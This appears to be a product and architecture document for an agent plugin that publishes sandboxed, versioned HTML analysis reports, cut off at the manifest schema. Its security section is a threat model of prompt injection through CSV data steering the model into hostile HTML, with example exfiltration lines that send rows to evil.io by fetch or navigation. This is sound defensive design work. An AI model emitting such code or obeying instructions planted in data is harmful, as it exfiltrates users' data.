# DataClaw Artifacts — PRD & Solution Architecture

| | |
|---|---|
| **Status** | Approved for build (post adversarial review) |
| **Owner** | Nandini Mathan |
| **Last updated** | 2026-07-07 |
| **Design board** | https://claude.ai/code/artifact/e48e22d1-58ab-4313-bbb7-f584d727eaa3 |
| **Ships as** | `plugins/dataclaw-artifacts/` |

---

## Release-note-first framing

DataClaw now has first-class analytical artifacts: when the agent builds a report, dashboard, chart, or living notebook report, it appears inline in the conversation, gets a stable identity and version history, can be revised by the agent, and can be exported safely. The old "here is a path to report.html" moment becomes a product surface: sandboxed, themed, shareable, and tied back to the investigation that produced it.

## Validation gate & degradation rule

- **Golden acceptance check:** run the golden notebook "csv-to-dashboard-to-revision" flow: ingest a CSV, execute an approved plan, publish v1 by `source_path`, revise the same `artifact_id` to v2, open the living report, switch light/dark themes, export HTML, and verify the planted hostile HTML/SVG fixtures cannot call the API or egress data.
- **Degradation rule:** if secure inline rendering is not green, artifacts may still store/version and return download-only attachments, but no inline/open-in-tab/export surface ships. If typed section convergence is late, raw HTML publish can ship behind the same security wall while `dashboarding`/`visualization` continue to use the compatibility `report_add_section` bridge. If artifact tools are not installed in a transitional runtime, skills must still create the canonical workspace HTML source and clearly report "artifact publishing unavailable"; they must not claim an `artifact_id`, version, URL, export, or living-report write that did not happen.

## Convergence checklist

| Surface | How this PRD uses it |
|---|---|
| Plugin | `plugins/dataclaw-artifacts/` auto-discovered like `dataclaw-plans` |
| Tools | `publish_artifact`, `read_artifact`, `list_artifacts`, `delete_artifact`, `report_note` |
| Hooks | session-id injection; P3 postToolCallHook capture for living report |
| Skills | `artifacts`, `dashboarding`, and `visualization` drive artifact-compliant output |
| UI | `artifact_published` AG-UI event, inline embed, read-only Artifact Library |
| Sub-agents | Not applicable in P1-P3; screenshot check uses browser plugin/tooling, not delegation |
| OpenClaw | Bridge manifest/allowlist exposes artifact tools as canonical names or `dataclaw_...` aliases with identical schemas |
| Validation | golden csv-to-dashboard-to-revision flow plus security fixtures and OpenClaw alias/manifest check |

---

# Part 1 — Product Requirements

## 1. Summary

DataClaw's agent already computes real analysis in notebooks, but its outputs die as loose workspace files: unstyled HTML previewed through an unsandboxed iframe, no identity, no versions, no history, no safe way to share. This project gives the agent a first-class **artifact** primitive — a self-contained, versioned, themed HTML document (report, dashboard, chart) — published through a tool, stored on disk, served behind a no-egress security wall, and rendered inline in the chat and in a library panel. On top of that primitive sits the **living notebook report**: one standing, multi-page artifact per investigation that compiles itself from hooks and never has to be rewritten by the agent. The existing `visualization` and `dashboarding` skills become first-class producers of artifacts, not parallel presentation systems: dashboarding chooses the story, visualization emits artifact-compliant visual evidence, and artifacts make the result durable, safe, revisable, and shareable.

**One-sentence version:** a `dataclaw-artifacts` plugin gives the agent a `publish_artifact` tool that versions self-contained HTML files on disk; the router serves them wrapped and themed with a no-egress CSP; the UI embeds them, sandboxed, right in the transcript with a library alongside; hooks compile each investigation's work into a living multi-page report — and the `artifacts`, `dashboarding`, and `visualization` skills plus a screenshot self-check make what comes out worth looking at.

## 2. Problem & motivation

1. **Analysis output has no product surface.** The agent writes `report.html` to the workspace; the user gets a file path. There is no versioning, no revision loop, no "show me what you made" moment in the conversation.
2. **The current preview path is a security hole.** `HtmlRenderer` in `ui/src/components/FilePreview.tsx` renders agent HTML in an **unsandboxed blob iframe** — blob documents inherit the app's origin, so model-emitted script can call the DataClaw API as the app. `SvgRenderer` injects agent SVG via `dangerouslySetInnerHTML` (an `<svg onload=…>` executes at app origin today, un-iframed). `files.py` serves any workspace HTML raw on the app origin. The threat is **prompt injection through data**: a CSV column can carry instructions; assume the model will be steered into emitting hostile HTML, and make the blast radius zero.
3. **The investigation's story evaporates.** Model params, decisions, dead ends, and direction changes live only in the transcript. "Did you try gradient boosting?" and "which version still had Q3 data?" have no answerable surface.

## 3. Goals

- **G1** — Agent can publish, revise, list, read, and delete versioned HTML artifacts through tools, with the same plugin grammar as `dataclaw-plans`.
- **G2** — Artifacts render **inline in the chat transcript** at the moment of publish (version-pinned), and the **right panel becomes an artifact library** (latest versions, history pickers, living report pinned on top). Right panel is read-only; all actions happen in the left chat (read-right / act-left).
- **G3** — Hostile artifact content cannot touch the app API or exfiltrate data — two independent walls (iframe sandbox + no-egress CSP), so one mistake doesn't become a breach.
- **G4** — Output looks designed by default: a consistent DataClaw theme (light + dark), applied at serve time via a token sheet; theme becomes pluggable per project later with zero artifact regeneration.
- **G5** — One **living notebook report** per investigation, keyed to the session/plan, that accumulates analyses, model params + repro info, decisions, and a complete log automatically — the agent never rewrites its HTML.
- **G6** — Exported artifacts are self-contained single files that carry their security walls with them.

### 3.1 Skill triad contract

Artifacts, visualization, and dashboarding are one delivery system:

- **Dashboarding skill = composition.** It scopes the user question, audience, decision, KPI/chart sequence, comparison logic, dashboard archetype, and revision loop.
- **Visualization skill = visual grammar.** It defines Plotly/KPI/table/caption contracts, chart integrity rules, aggregate-only data policy, responsive behavior, accessibility, and token usage.
- **Artifacts plugin = product surface.** It publishes, versions, serves, embeds, exports, themes, secures, and indexes the deliverable.
- **Polish layer = shared skill contract.** Layout rhythm, type scale, visual hierarchy, overflow behavior, and both-theme token usage live in the visualization/dashboarding/artifacts skill contract.

Rule: no skill should produce a final visual deliverable through a competing surface. The legacy App/report helpers become compatibility inputs into artifact sections until they are fully retired.

Surface choice rule: use `publish_artifact` for a standalone user-facing report, dashboard, chart page, profile, or model card. Use `report_note` for incremental interpretation, decisions, rationale, and "why we changed course" narrative that belongs in the living report. Major published artifacts should also be linked or summarized in the living report, but a living-report note is not a substitute for publishing a requested dashboard/report.

## 4. Non-goals

- **Live/data-querying artifacts.** `connect-src 'none'` is permanent (Decision D4). Artifacts that fetch from the API would reopen the exfiltration channel; if ever wanted, that is a separate design with scoped, signed, read-only data tokens.
- **Multi-tenant hosting / auth.** DataClaw is local-first, single-user. A tokenized share-link route is P4-optional, contingent on a hosted mode existing.
- **HTML-level version diffing.** Diffing happens at the manifest level (tractable), not the rendered HTML (not).
- **Arbitrary JS runtime modules.** The only allowed external script is the vendored plotly, served from `/artifact-runtime/` under a nonce (P2).
- **A second dashboard product surface.** The App panel can remain as a compatibility/curation view during migration, but artifacts are the durable final surface for reports and dashboards.

## 5. Users & use cases

The user is a data scientist (or a stakeholder they share with) working through DataClaw's chat + notebook surface.

| # | Use case | What must be true |
|---|---|---|
| U1 | "Analyze this CSV and give me a report" | A themed, interactive, both-themes artifact appears inline in chat with zero design guidance in the prompt |
| U2 | "Make the positional chart a heatmap" | Agent edits the canonical source file, republishes same `artifact_id` → v+1; panel refreshes to latest; history preserved |
| U3 | Scroll back through a long session | Each inline embed still shows the version it announced (version-pinned transcript); lazy-mounted so 20 embeds don't wreck scrolling |
| U4 | "What's the state of this investigation?" | Open the living report: Overview, Analyses, Models, Decisions, Log pages — current as of the last cell run |
| U5 | "Did you try gradient boosting?" | Superseded entries render collapsed with their reason in the body and stay fully visible in the Log — dead ends are findings |
| U6 | "Which model won, and can I trust the comparison?" | Models page is a comparison matrix pinned to a declared primary metric and baseline row; runs with differing eval-data digests are badged "not directly comparable" |
| U7 | Share a report with a stakeholder | Export a single .html that renders identically anywhere — with a no-egress `<meta>` CSP injected so the walls travel with the file |
| U8 | Come back tomorrow | "Changed since you last viewed" badges; stable entry anchors (`#e-063`) so chat cards and plan decisions deep-link to evidence |
| U9 | A poisoned dataset steers the model into hostile HTML | Nothing: no API call, no fetch, no pixel, no top navigation. Publish-time validation rejects loudly with a machine-readable reason |

## 6. Functional requirements

### 6.1 Publishing & versioning

- **FR-1** `publish_artifact(title, description?, source_path? | html?, artifact_id?, label?, base_version?)`. Exactly one of `source_path` (preferred — publishing costs ~50 tokens regardless of size) or inline `html` (small artifacts only). Returns `{artifact_id, version, url}`.
- **FR-1a Tool namespace contract** The canonical Python/plugin registry names are unprefixed: `publish_artifact`, `read_artifact`, `list_artifacts`, `delete_artifact`, and `report_note`. The OpenClaw bridge may expose plugin-scoped aliases such as `dataclaw_publish_artifact`; generated manifests/allowlists must map those aliases back to the canonical contract. Skills should name the canonical tool and may add "or the runtime's `dataclaw_...` alias" only where the agent actually sees prefixed tools.
- **FR-2** Same `artifact_id` → new version, same URL. Version history is free; a per-version `label` names the milestone.
- **FR-3** `base_version` compare-and-set: a stale base returns a structured conflict, never last-writer-wins.
- **FR-4** Validation gate at publish (reject loudly, machine-readable reason): ≤ 5 MB; no external `script src` / `link href` / remote `img src`; no `<iframe>` / `<object>` / `<embed>` / `<base>`; **relative** asset references are inlined at publish time from the workspace (not rejected, not left to 404 in an opaque origin). External `<a href>` allowed — escaped to the parent at click time. Skill contract: fix-and-retry once, then surface the error — no silent ping-pong.
- **FR-5** Every publish writes the stored version back to a canonical workspace path, so the file the agent edits *is* the artifact's source of truth.
- **FR-6** `read_artifact(artifact_id, version?)` returns clean (unwrapped) source for the revision loop. `list_artifacts()` is session-scoped. `delete_artifact` exists from day one, with a library affordance.
- **FR-7** Identical content (sha256) short-circuits to the existing version — self-check republish loops don't mint junk versions.

### 6.2 Surfaces

- **FR-8** On publish, an `artifact_published` AG-UI event drops a **sandboxed inline embed** into the transcript — the artifact itself, not a card with a button. Version-pinned forever, lazy-mounted (IntersectionObserver), height-capped, with "expand".
- **FR-9** The right panel is the **artifact library**: every session artifact at latest version, per-entry history picker, the living report pinned on top (no version badge — it *is* the current state). Loading / error / missing-version states required.
- **FR-10** Open-in-tab and export-.html actions per artifact. Standalone/open-in-tab renders through the same sandboxed host shell as inline embeds; export is a single HTML host shell with the artifact body inside a sandboxed document plus a no-egress `<meta>` CSP, so the exported body is not promoted to an unsandboxed top-level page.
- **FR-11** Theme sync: the embedding surface posts `{theme: 'light' | 'dark'}` into each iframe on load and on toggle; the injected runtime stamps `data-theme` on the artifact root. Same message and runtime in chat, library, or standalone tab.

### 6.3 Living notebook report

- **FR-12** One standing report per investigation, **keyed to the session's plan, faceted by notebook** ("per notebook" is a filter view, not the data model — a two-notebook investigation doesn't fork its own story).
- **FR-13** Captured automatically via `postToolCallHook` on cell execution, plan updates/decisions, and MLflow run completion. Every capture snapshots **content, never references**: figure bytes into a content-addressed asset store; the nbformat `cell id` + source hash (cell indexes reshuffle on insert and outputs are overwritten in place); run params + metrics + a **repro block** (data digest, seed, env freeze).
- **FR-14** `report_note(page, markdown, plan_step_id?)` is the agent's narrative channel — interpretation, rationale, direction changes. Skill rule: one note per finding, one per changed course; `plan_step_id` is identity, step names are display labels.
- **FR-15** Manifest entries are **immutable, append-only, with supersede edges** — never latest-wins slots. Superseded entries render collapsed with their reason in the body and stay visible in the Log.
- **FR-16** Pages: **Overview** (latest note per page + headline metrics + plan state), **Analyses** (figures/tables/notes grouped by plan step; re-executed cells supersede), **Models** (comparison matrix: declared primary metric, baseline row, deltas, "not directly comparable" badges on mismatched eval-data digests), **Decisions** (the "why" trail), **Log** (everything, filterable, superseded included).
- **FR-17** **Checkpoints are materialized**: compiled once and frozen with figures embedded as data URIs at plan-step completion (label = step name) — because the workspace files the manifest points at are overwritten by the next cell run. Live view = render-on-serve, no version number.
- **FR-18** "Changed since you last viewed" badges from a last-seen timestamp; stable per-entry anchors (`#e-063`) for deep links from chat cards and plan decisions.

### 6.4 Quality of output

- **FR-19** Skill convergence: `artifacts`, `dashboarding`, and `visualization` load whenever a plan step produces a report/dashboard artifact. `dashboarding` chooses the storyboard; `visualization` emits typed visual sections (chart/KPI/table/callout/findings), visual polish, and integrity checks; `artifacts` supplies lifecycle, validation, versioning, theme-token expectations, export, and no inline event handlers (`addEventListener` only — nonces can't cover inline handlers). Existing `report_add_section` calls are a compatibility bridge into typed artifact sections, not a separate final surface. The current `report_add_section` implementation must stop falling back to remote Plotly/CDN scripts before artifact publish can be considered green; until then, publish validation rejects the source and skills must fix once then surface the machine-readable error.
- **FR-20** Data contract: **aggregate in the notebook, not the browser.** Summary series computed in pandas, embedded as a `<script type="application/json">` island, ≤ 200 KB. Never raw datasets. Table previews follow the shared cap: default 20 rows and 50 KB per rendered card/section, with binary/control-character redaction.
- **FR-21** Self-check loop: after publishing, the agent screenshots its own artifact via `dataclaw-browser` and verifies layout before closing the plan step. In transitional environments where the browser tooling is not installed, the skill marks screenshot self-check unavailable and does not block the artifact publish/revision flow.

## 7. Non-functional requirements

- **NFR-1 Security** — see §Architecture Security model. Headline: sandbox without `allow-same-origin` (opaque origin), `connect-src 'none'`, no `allow-popups`/`allow-top-navigation`, teardown on off-origin navigation, export carries a sandboxed host shell plus a `<meta>` CSP. Two independent walls at all times.
- **NFR-2 Safe-by-default deployment** — server binds `127.0.0.1` by default (today's `0.0.0.0` makes the auth-free API LAN-reachable).
- **NFR-3 Durability** — writes are tmp → fsync → atomic-rename under a per-artifact lock; version numbers derive from `v*.html` files on disk, never trusted from `meta.json`; corruption is surfaced, not swallowed. (The plans-store pattern — whole-file rewrite, corruption swallowed to `[]` — is explicitly what *not* to inherit.)
- **NFR-4 Performance** — 5 MB cap applies to a *published/exported* single file, not the manifest store (content-addressed assets live beside the manifest; pages compose per-page — a two-week investigation blows a single-file budget around chart 25). Log page virtualizes past a few hundred entries. Inline embeds lazy-mount.
- **NFR-5 Storage hygiene** — sha256 dedup, keep-last-N retention as a stopgap (real quota/GC policy is an open item), `delete_artifact` from day one.

## 8. Phasing & exit criteria

| Phase | Scope | Duration | Exit test |
|---|---|---|---|
| **P0 — Preview security hardening** | Standalone PR before plugin work: bind `127.0.0.1`, fix `files.py` root checks with `Path.is_relative_to`, serve workspace HTML/SVG as attachments or behind artifact CSP, sandbox `FilePreview` HTML and route SVG away from `dangerouslySetInnerHTML` | this week | Hostile HTML/SVG fixtures cannot call the API, execute at app origin, path-traverse outside roots, or render inline without sandbox/CSP |
| **P1 — The spine** | Plugin skeleton (store/tools/router), validation gate, `ArtifactPanel.tsx` + `PublishArtifactCard.tsx`, store hygiene, session-scoping hook, safe-by-default serving everywhere using P0 fixes | ~1 week | Agent publishes v1, revises to v2 by path, panel shows latest; generated OpenClaw manifest/allowlist exposes publish/read/list/delete/report-note tools with identical canonical/alias schemas; a planted `fetch()` is blocked by CSP and a planted API call by the sandbox — both verified in the browser console |
| **P2 — Make it good** | Serve-time wrapper (skeleton, reset, theme runtime), `--dc-*` token sheet light+dark, plotly at `/artifact-runtime/` under per-response nonces, `artifacts` + `dashboarding` + `visualization` skill convergence, typed artifact section bridge for `report_add_section`, `artifact_published` live event + version picker | ~1 week | "Analyze this CSV and give me a report" → themed, interactive, both-modes artifact inline in chat, zero design guidance in the prompt |
| **P3 — Living report** | `manifest.jsonl` store + serve-time compiler, capture hooks, `report_note` tool, materialized checkpoints, and the `dataclaw-plans` `plan_step_id` fix (`update_plan` must attribute by id, not name fallback) | ~1–2 weeks | Full plan run end-to-end → report accumulates analyses, params, decisions, complete log with zero explicit publish calls; renamed plan steps do not fork attribution |
| **P4 — Harden & share** | Origin isolation (`artifacts.localhost`, app-wide Host middleware), export host shell with sandboxed child document + injected `<meta>` CSP + print stylesheet, screenshot self-check loop | as needed | Artifact JS cannot read or reach anything of the app's origin even with a hypothetically misconfigured iframe |

## 9. Open questions (reviewed, deliberately not blocking P1)

| Item | Why it matters | Direction |
|---|---|---|
| Stakeholder comments | The reader can't talk back; today's feedback path is a screenshot in Slack | Sidecar store keyed by entry anchor, relayed through the postMessage runtime channel — never from artifact JS directly, so no-egress stands |
| Checkpoint granularity | Five training runs inside one step collapse into one checkpoint | Checkpoint on supersede and decision events too; store manifest deltas + content-addressed assets, materialize HTML on demand |
| Search & version diff | "Which version still had Q3 data?" is a manual binary search | Index manifest entries; diff versions at the manifest level (added / superseded / metric deltas) |
| Quota & GC policy | Self-check republish loops write megabytes per iteration | Per-workspace budget with a settings surface; content-addressed assets dedup the worst of it |

## 10. Success metrics

- Every completed analysis plan ends with ≥ 1 published artifact (vs. loose files today).
- Revision loop cost: a "change the chart" request round-trips in one `read_artifact`/edit/`publish_artifact` cycle, ~50-token publish overhead.
- Security exit tests (P1/P4) pass in CI-style browser checks, and the three known preview holes (`HtmlRenderer`, `SvgRenderer`, raw `files.py` HTML) are closed.
- The living report answers "what happened and why" without the user reading the transcript: params, decisions, and dead ends all recoverable.
- `visualization` and `dashboarding` outputs converge on artifacts: no final dashboard ships only as loose charts, App-panel state, or prose.

---

# Part 2 — Solution Architecture

## 1. System context

Artifacts ship as **one more plugin**, using the exact grammar the repo already has (`DataclawPlugin.register(ctx)`: `ctx.tool_registry.register_tool(PythonTool(...))`, `ctx.include_api_router`, `ctx.hooks.register`). What the repo already provides and what's reused:

| Piece | Location | Role here |
|---|---|---|
| Plugin system | `dataclaw/plugins/base.py` | Artifacts ship as one more plugin |
| Workspace files | `dataclaw/api/routers/files.py` | `source_path` publishing input (plus P1 fixes below) |
| Notebooks plugin | `plugins/dataclaw-notebooks` | Aggregates feed the report's inline JSON island |
| Plotly, vendored | `ui/package.json` → `plotly.js-dist-min` | The one allowed runtime module (P2) |
| Visualization/dashboarding skills | `skill-library/visualization.md`, `skill-library/dashboarding.md` | Produce artifact-compliant visual evidence and dashboard storyboards |
| Skill library | `skill-library/` | Home of the artifacts, dashboarding, and visualization skills |
| Browser plugin | `plugins/dataclaw-browser` | Post-publish screenshot self-check |
| HTML/SVG preview | `ui/src/components/FilePreview.tsx` | **Fix** — currently runs agent HTML same-origin with the app |

The missing piece is not rendering or storage — it's the **artifact as a first-class entity** (identity, versions, publish contract) and a **safe serving layer**.

## 2. Architecture — five lanes

```
AUTHOR    dashboarding scopes the storyboard; visualization computes aggregates
          (54,600 rows → ~50 summary series) and emits typed visual sections
          → agent writes report.html (workspace file · inline CSS/JS · JSON island)
                        │  publish_artifact(title, source_path, artifact_id?)
PUBLISH   validate (size cap · no external src · no iframes)
          → version (same id → v+1 · sha256 dedup · label)
                        │
STORE     workspaces_dir()/artifacts/<id>/
          meta.json · v1.html … vN.html   (raw author HTML, exactly as written)
                        │  GET /api/artifacts/{id}?v=N
SERVE     wrap on serve (doctype · reset · theme tokens · runtime)
          + CSP headers (connect-src 'none' · script-src inline / nonced)
          + /artifact-runtime/plotly.min.js (P2, nonced)
                        │  theme sync via postMessage ↑↓
RENDER    inline chat embed (sandboxed iframe · version-pinned)
          · ArtifactLibrary panel (latest + history · live report pinned)
          · open in tab / export .html (same sandbox host shell; walls travel)
```

Validation happens **once at publish**; wrapping happens **at serve time**; trust boundaries are enforced at the last two lanes regardless of what the first three produce.

## 3. Key decisions

| ID | Decision | Why | Rejected alternative |
|---|---|---|---|
| **D1** | **Wrap on serve, validate on publish.** Stored `vN.html` is the raw author document; doctype skeleton, CSS reset, theme runtime injected at GET time. | `read_artifact` returns clean source for revision; runtime improvements apply retroactively to every artifact. | Wrap at publish — freezes old artifacts on old runtimes; read-modify-write accumulates wrapper cruft. |
| **D2** | **File path in, not HTML in.** `source_path` is the primary publish input. | A 200 KB report as a tool argument round-trips the context window twice; by path, publish costs ~50 tokens. Revision works by targeted string replacement on the file. | Inline-only `html` (kept, but for small artifacts only). |
| **D3** | **Sandbox first, origin isolation second.** Ship on the app origin behind an opaque-origin iframe + no-egress CSP; `artifacts.localhost` is P4 hardening. | Keeps P1 to zero infra while closing the actual hole. | Reverse order — a separate origin with a lax iframe would still let the artifact script against its embedder. |
| **D4** | **No egress, ever.** `connect-src 'none'` is permanent; data is embedded, aggregated, at publish time. | Live artifacts would reopen the exfiltration channel; static artifacts are durable (render identically exported, emailed, or in two years). | API-querying artifacts — out of scope; would need scoped signed read-only tokens, a separate design. |
| **D5** | **Theme and visual grammar are contracts, not one-off CSS.** Artifacts author against `--dc-*` custom properties and typed sections emitted by the visualization/dashboarding skills; the serve-time wrapper injects the active sheet (light + dark) ahead of artifact CSS. | One DataClaw theme now, one visual-output grammar now; pluggability later = one per-project token file, retroactive via D1. | Themes baked into artifacts — a rebrand becomes a regeneration of every report ever published; dashboard skills hand-roll visual systems per task. |
| **D6** | **Manifest = append-only event log with supersede edges** — never latest-wins slots. | Dead ends are findings; re-executed cells and re-opened steps must not silently rewrite what a checkpoint froze. Four failure modes trace to this one decision. | Table of live references with latest-wins — misattributes on cell reindex, loses overwritten outputs, deletes the answer to "did you try X?". |

## 4. Plugin layout

```
plugins/dataclaw-artifacts/
  dataclaw_artifacts/
    __init__.py       # DataclawPlugin.register — tools, router, hooks, ui_manifest
    store.py          # disk layout, atomic writes, locks, dedup, retention
    tools.py          # publish/read/list/delete_artifact, report_note (P3)
    router.py         # list/get endpoints, serve-with-CSP, /artifact-runtime/*
    wrapper.py        # serve-time wrapper: skeleton, reset, tokens, runtime, nonces
    sections.py       # typed chart/KPI/table/callout/findings section schema + validation
    manifest.py       # (P3) manifest.jsonl append/read, supersede resolution
    compiler.py       # (P3) manifest → multi-page single-file HTML
    hooks.py          # session-id injection (active_plan_context_hook pattern),
                      # (P3) postToolCallHook captures
  tests/
ui/src/components/
  ArtifactPanel.tsx               # right-panel library (read-only)
  tool-renderers/PublishArtifactCard.tsx   # inline chat embed
  skill-library/artifacts.md        # lifecycle/security skill
  skill-library/dashboarding.md     # storyboard/composition skill
  skill-library/visualization.md    # visual grammar/polish skill
```

Session scoping: `list_artifacts` cannot scope itself — a pre-tool-call hook injects `session_id`, following the existing `active_plan_context_hook` pattern.

Existing core UI files touched in P1/P2:

- `ui/src/pages/ChatPage.tsx` — add the artifact sidebar tab/library wiring and event-driven refresh.
- `ui/src/components/tool-renderers/ToolResultRenderer.tsx` — route `publish_artifact` results to `PublishArtifactCard.tsx`.
- `ui/src/components/ToolCallCard.tsx` — ensure artifact embeds can auto-expand without showing raw tool JSON first.
- `ui/src/components/FilePreview.tsx` — close the existing HTML/SVG preview holes in P1.

## 5. Tool contract

Canonical tool names below are the DataClaw plugin registry names. OpenClaw may expose `dataclaw_...` aliases for plugin scoping; the bridge must keep the schema identical and route aliases to the same implementation. Skills should not mix dialects inside examples unless they explicitly say "use the visible runtime alias."

```python
("publish_artifact",
 "Publish a self-contained HTML artifact (report, dashboard) to the user. "
 "Pass artifact_id to update an existing artifact in place (new version, same URL).",
 publish_artifact, {
    "type": "object",
    "properties": {
        "title":        {"type": "string",  "description": "Human-readable artifact title"},
        "description":  {"type": "string",  "description": "One-line summary", "default": ""},
        "source_path":  {"type": "string",  "description": "Workspace path of the HTML file to publish (preferred)"},
        "html":         {"type": "string",  "description": "Inline HTML — small artifacts only"},
        "artifact_id":  {"type": "string",  "description": "Existing artifact to update; omit to create"},
        "label":        {"type": "string",  "description": "Short version label, e.g. 'per-position-charts'"},
        "base_version": {"type": "integer", "description": "Version this update was based on — conflict if stale"},
    },
    "required": ["title"],
})
# → {"artifact_id": "art-3f9c21ab", "version": 3, "url": "/artifacts/art-3f9c21ab"}

("read_artifact", "Read the current source of an artifact, for revising it",
 read_artifact, {
    "type": "object",
    "properties": {
        "artifact_id": {"type": "string"},
        "version":     {"type": "integer", "description": "Defaults to latest"},
    },
    "required": ["artifact_id"],
})

("list_artifacts", "List artifacts for the current session", list_artifacts,
 {"type": "object", "properties": {}})

# plus: delete_artifact (P1) · report_note(page, markdown, plan_step_id?) (P3)
```

Unavailable-tool behavior for skills: if none of the artifact tools (canonical or aliased) are visible, build and validate the canonical workspace source path anyway, record the intended title/description, and tell the user that artifact publication is blocked by missing tooling. Do not invent artifact ids, versions, URLs, export state, or living-report writes.

Typed section bridge for skill-generated dashboards (P2):

```json
{
  "section_id": "sec-primary-chart",
  "kind": "chart",
  "title": "Revenue by segment",
  "caption": "Enterprise drove 62% of growth; SMB declined after Q3.",
  "plan_step_id": "s2",
  "data_policy": "aggregate_only",
  "payload": {
    "plotly_json_asset": "sha256:9c1f...",
    "summary_json_bytes": 48213
  },
  "tokens": ["--dc-bg", "--dc-ink", "--dc-accent"]
}
```

`report_add_section` remains usable, but the implementation maps its `header`, `metric_row`, `chart`, `findings`, `callout`, `text`, and `table` sections into this schema before rendering. That gives visualization/dashboarding one stable target while artifacts own validation, rendering, versioning, and export. The legacy shell must not emit remote assets in artifact mode; its current Plotly CDN fallback is a P2 cleanup item and a publish-time validation fixture.

## 6. Publish pipeline

Runs inside the tool call, in order. **Reject loudly** — a failed publish with a reason is something the agent can fix; a silently mangled artifact is not.

1. **Resolve the source.** Read `source_path` from the workspace (same allowed-roots check as `files.py`, using `Path.is_relative_to`) or take inline `html`. Exactly one must be present.
2. **Enforce self-containment.** Size cap (5 MB) for the published/exported single-file output, not for the living-report manifest store. Reject external `script src` / `link href` / remote `img src`. Inline relative asset references from the workspace at publish time. Reject `<iframe>`, `<object>`, `<embed>`, `<base>`. Allow external `<a href>` — the runtime escapes them to the parent at click time. Rejection returns a machine-readable reason; the skill's contract is fix-and-retry once, then surface to the user.
3. **Assign identity and version — safely.** New → `art-<uuid8>`, v1. Existing → v+1, guarded: `base_version` compare-and-set (stale → structured conflict); next version derived from `v*.html` files on disk, not `meta.json`; tmp → fsync → atomic rename under a per-artifact lock; identical sha256 short-circuits to the existing version. Write the published version back to the canonical workspace path.
4. **Emit the event.** Push `artifact_published` down the AG-UI stream so the panel opens or refreshes mid-run, the way plan proposals already surface live.

## 7. Storage layout

```
workspaces_dir()/artifacts/
  art-3f9c21ab/
    meta.json            # id · title · description · session_id · versions[] (label, sha256, ts) · share
    v1.html … vN.html    # raw author HTML, exactly as written (D1)
  art-9be1c044/          # a living report
    meta.json
    manifest.jsonl       # append-only event log (P3)
    assets/
      sha256-9c1f….png   # content-addressed figure snapshots
    checkpoints/
      s2-eda.html        # materialized, frozen, figures embedded as data URIs
```

Local-first, plain files, no database. JSONL for the manifest because appends are crash-safe and parallel hooks don't clobber each other.

## 8. Security model

Threat: **prompt injection through data.** Two independent walls, so one mistake doesn't become a breach.

| Threat | Concrete scenario | Wall | Result |
|---|---|---|---|
| Script vs. the app | Report JS calls `POST /api/plans/…/decision` with the app's origin | iframe `sandbox="allow-scripts"` — **never** `allow-same-origin` → opaque origin; `frame-ancestors` pins embedding to the app | **Blocked** |
| Data exfiltration | `fetch('https://evil.io/?d='+rows)`, a tracking pixel — or `location.href='https://evil.io/?d='+…`, which CSP does **not** govern | CSP kills fetch/XHR/WS/pixels (`connect-src 'none'`, `img-src data:`); navigation is the residual channel — sandbox omits `allow-popups` and `allow-top-navigation`, host tears down an embed that navigates off-origin | **Contained** |
| Phishing links | Lookalike "re-enter your key" link | Runtime intercepts external links → parent opens deliberately, showing the real destination | Contained |
| Resource abuse | 300 MB document; infinite JS loop | 5 MB publish cap; iframe process isolation keeps the app responsive | Contained |
| Sidestep via files route | The report.html that *failed* validation opens raw via `/api/workspace/files?path=…` — app origin, no CSP | `files.py` serves HTML/SVG with `Content-Disposition: attachment` or behind the artifact CSP; root check moves from `startswith` (prefix-spoofable) to `Path.is_relative_to` | **Fix in P1** |
| Export bypass | Exported .html opens from file:// — no response headers, no app iframe wrapper, full network | Export produces a host-shell HTML file: the artifact body is placed in a sandboxed child document and the shell injects a no-egress `<meta http-equiv="Content-Security-Policy">` for defense in depth | Contained |

Serve-time headers (P1):

```
Content-Security-Policy:
  default-src 'none';
  script-src 'unsafe-inline';   # P1: inline only. NOT 'self' — on the app origin,
                                # 'self' allowlists every route, including the files API
  style-src 'unsafe-inline';
  img-src data: blob:;
  font-src data:;
  connect-src 'none';           # no fetch, no XHR, no WebSocket
  base-uri 'none'; form-action 'none';
  frame-ancestors http://localhost:* http://127.0.0.1:* http://[::1]:*;
X-Content-Type-Options: nosniff
```

**Plotly without `'self'` (P2):** the wrapper already rewrites the document on serve, so it stamps a per-response nonce onto every script tag (the artifact's inline ones and the `/artifact-runtime/plotly.min.js` include) and the policy becomes `script-src 'nonce-…'`. Path-based CSP allowlists are not an option — the spec voids path components after redirects. The design skill bans inline event handlers, since nonces can't cover them.

**Standalone/open-in-tab rendering is still wrapped.** `/artifacts/{id}` must return a host shell that embeds the artifact in a sandboxed child document, not the raw author HTML as the top-level page. The iframe sandbox is what blocks navigation-based exfiltration; CSP is defense in depth. Export uses the same host-shell pattern in a single file.

**Origin isolation (P4) is middleware, not a route check.** Checking Host only on artifact endpoints proves nothing while `http://artifacts.localhost:8000/api/…` still answers — enforce a Host allowlist app-wide. Caveats: Safari does not resolve `*.localhost` (document the `/etc/hosts` line, or fall back to a second port — also a distinct origin); `artifacts.localhost` is a different origin but the **same site** as `localhost`, so any future auth must never scope cookies with `Domain=`. And `__main__.py` binds `0.0.0.0` today — default to `127.0.0.1` in P1.

**P1 fixes to existing code (same PR as the plugin or before it):**

1. `dataclaw/__main__.py` — bind `127.0.0.1` by default.
2. `dataclaw/api/routers/files.py` — `Path.is_relative_to` root check; HTML/SVG served as attachment or behind the artifact CSP.
3. `ui/src/components/FilePreview.tsx` — `sandbox="allow-scripts"` on the `HtmlRenderer` blob iframe; `SvgRenderer` stops using `dangerouslySetInnerHTML` and routes through the sandboxed path. (Blob documents inherit no CSP, so previews fully close only when routed through the artifact serving path.)

## 9. The living notebook report

**The agent never rewrites this report's HTML.** The report is a *rendering* of a manifest; the manifest is fed by hooks the platform already fires, plus one narrative tool. D1 taken to its conclusion: not just wrap-on-serve — **render-on-serve**.

Three channels:

- **Captured (hooks)** — `postToolCallHook` on cell execution, plan updates/decisions, MLflow run completion. Every capture snapshots **values, never references**: figure bytes → content-addressed asset store; nbformat `cell_id` + source hash (cell *indexes* reshuffle on insert; outputs are overwritten in place — live references misattribute silently); run params + metrics + repro block (`data_digest`, `seed`, `env_freeze`).
- **Narrated (one tool)** — `report_note(page, markdown, plan_step_id?)`: interpretation, rationale, direction changes — the decisioning layer no hook can capture.
- **Compiled (on serve)** — the serve route compiles manifest → multi-page single-file HTML with hash-tab navigation. Compiler improvements apply retroactively to every report.

### Manifest schema (`manifest.jsonl`, append-only)

```jsonl
